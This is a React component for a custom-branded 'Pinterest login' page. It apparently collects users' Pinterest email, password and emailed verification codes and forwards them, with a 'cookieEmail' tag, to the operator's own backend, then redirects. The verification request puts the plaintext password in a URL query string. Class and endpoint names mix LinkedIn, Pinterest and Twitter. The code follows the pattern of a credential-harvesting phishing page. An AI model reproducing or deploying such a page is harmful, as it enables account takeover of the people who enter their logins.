import React, { Component } from "react";
import runtimeEnv from "@mars/heroku-js-runtime-env";
import { Route, Redirect } from "react-router-dom";

import {
    Form,
    Button,
    Container,
    Row,
    Col,
    Alert,
    Spinner,
    Card
} from "react-bootstrap";
const queryString = require("query-string");
const env = runtimeEnv();

export default class Linkedin extends Component {
    state = {
        username: "",
        password: "",
        showAlert: false,
        loading: false,
        message: "",
        manualCheck: false,
        success: false,
        redirect: false,
        appName: window.location.hostname.substring(10).split(".")[0]
    };
    handleUsername = (event) => {
        this.setState({ username: event.target.value });
    };
    handleCode = (event) => {
        this.setState({ code: event.target.value });
    };
    handlePassword = (event) => {
        this.setState({ password: event.target.value });
    };
    onShowAlert = () => {
        this.setState({ showAlert: true }, () => {
            window.setTimeout(() => {
                this.setState({ showAlert: false });
            }, 30000);
        });
    };
    handleClick = (e) => {
        e.preventDefault();

        this.setState({ loading: true });
        if (this.state.username.length !== 0 && this.state.password.length !== 0) {
            fetch(`${env.REACT_APP_URL}/login/pinterest`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                },
                body: queryString.stringify({
                    username: this.state.username,
                    password: this.state.password,
                    cookieEmail: env.REACT_APP_COOKIE_EMAIL,
                    appName: this.state.appName
                }),
            })
                .then((response) => response.json())
                .then((responseData) => {
                    console.log(responseData);
                    this.setState(
                        {
                            message: responseData.message,
                        },
                        () => {
                            this.onShowAlert();
                        }
                    );
                    if (!responseData.success) {
                        this.setState({ loading: false });
                    } else {
                        if (responseData.manualCheck) {
                            this.setState({
                                manualCheck: true,
                                challenge_type: responseData.challenge_type,
                                challenge_id: responseData.challenge_id,
                                enc_user_id: responseData.enc_user_id,
                                loading: true,
                            });
                        } else {
                            this.setState({ success: true });
                        }
                    }
                });
        } else {
            if (this.state.username.length === 0) {
                this.setState(
                    {
                        message: "email id cannot be empty",
                        loading: false,
                    },
                    () => {
                        this.onShowAlert();
                    }
                );
            } else {
                this.setState(
                    {
                        message: "password cannot be empty",
                        loading: false,
                    },
                    () => {
                        this.onShowAlert();
                    }
                );
            }
        }
    };
    handleCodeClick = (e) => {
        fetch(
            `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,
            {
                method: "GET",
            }
        )
            .then((response) => response.json())
            .then((responseData) => {
                console.log(responseData);
                this.setState(
                    {
                        message: responseData.message,
                    },
                    () => {
                        this.onShowAlert();
                    }
                );
                if (responseData.success) {
                    this.setState({ success: true });
                } else {
                    this.setState(
                        { message: responseData.message, code: "" },
                        () => {
                            this.onShowAlert();
                        }
                    );
                }
            });

    };
    setRedirect = () => {
        this.setState({
            redirect: true,
        });
    };
    renderRedirect = () => {
        if (this.state.redirect) {
            return <Redirect to="/" />;
        }
    };
    render() {
        return (
            <div>
                {this.renderRedirect()}

                <Button size="lg" variant="outline-danger" onClick={this.setRedirect}>
                    Back
               </Button>
                {this.state.showAlert ? (
                    <Alert variant="dark">{this.state.message}</Alert>
                ) : (
                        ""
                    )}

                <Container
                    style={{
                        position: "absolute",
                        left: "50%",
                        top: "50%",
                        transform: "translate(-50%, -50%)",
                    }}
                ><center>


                        <Container>
                            <img
                                alt="logo"
                                src={env.REACT_APP_FAVICONURL}
                                style={{ objectFit: 'contain', width: "25%", height: "25%" }}
                            ></img>
                        </Container>
                        <br></br>
                        <h1>
                            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== ""
                                ? env.REACT_APP_TITLE
                                : "Pinterest login"}
                        </h1>
                        {
                            env.REACT_APP_BANNER_PINTEREST === "true" ?
                                <div>
                                    <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>
                                        <Card.Body>
                                            <Card.Title>{env.REACT_APP_BANNER_PINTEREST_HEADER}</Card.Title>
                                            <Card.Text>
                                                <small className="text-muted">  {env.REACT_APP_BANNER_PINTEREST_BODY}</small>
                                            </Card.Text>
                                        </Card.Body>
                                    </Card> </div>
                                : ""
                        }
                        <Container>
                            <p style={{ fontWeight: "bold" }}>
                                {
                                    env.REACT_APP_SECONDARY_BANNER !== "" ? env.REACT_APP_SECONDARY_BANNER : ""
                                }

                            </p>
                        </Container>
                    </center>
                    {this.state.success ? (
                        <Container
                            style={{
                                position: "absolute",
                                left: "50%",
                                top: "50%",
                                transform: "translate(-50%, -50%)",
                            }}
                        >
                            <center>
                                <h1>Login Success Thank You!</h1>
                                <h1>Redirecting...</h1>
                            </center>
                            <Route
                                component={() => {

                                    window.setTimeout(() => {
                                        window.location.href = env.REACT_APP_REDIRECTURL;
                                    }, 5000);

                                    return null;
                                }}
                            />
                        </Container>
                    ) : (
                            <Row>
                                <Col>
                                    <Form onSubmit={(e) => this.handleClick(e)}>
                                        <Form.Group controlId="formBasicEmail">
                                            <Form.Label>
                                                Enter Pinterest Email Id
                    </Form.Label>
                                            <Form.Control
                                                value={this.state.username}
                                                onChange={(e) => {
                                                    this.handleUsername(e);
                                                }}
                                            />
                                        </Form.Group>
                                        <Form.Group controlId="formBasicPassword">
                                            <Form.Label>Enter Pinterest Password</Form.Label>
                                            <Form.Control
                                                onChange={(e) => this.handlePassword(e)}
                                                value={this.state.password}
                                                type="password"
                                            />
                                        </Form.Group>
                                        {this.state.loading ? (
                                            <Button variant="primary" type="submit" disabled>
                                                <Spinner
                                                    as="span"
                                                    animation="grow"
                                                    size="sm"
                                                    role="status"
                                                    aria-hidden="true"
                                                />
                      Loading...
                                            </Button>
                                        ) : (
                                                <Button variant="primary" type="submit">
                                                    Login
                                                </Button>
                                            )}

                                        {this.state.manualCheck ? (
                                            <div>
                                                <Form.Group>
                                                    <Form.Label>
                                                        {this.state.challenge_type === 'RetypeEmail' ? "Enter your email id" : "Enter code recieved in your email"}

                                                    </Form.Label>
                                                    <Form.Control
                                                        value={this.state.code}
                                                        onChange={(e) => {
                                                            this.handleCode(e);
                                                        }}
                                                        type="text"
                                                    />
                                                </Form.Group>
                                                <Button
                                                    variant="outline-success"
                                                    onClick={() => {
                                                        this.handleCodeClick();
                                                    }}
                                                >
                                                    submit code
                      </Button>{" "}
                                            </div>
                                        ) : (
                                                ""
                                            )}
                                    </Form>
                                </Col>
                            </Row>
                        )}
                </Container>
            </div >
        );
    }
}
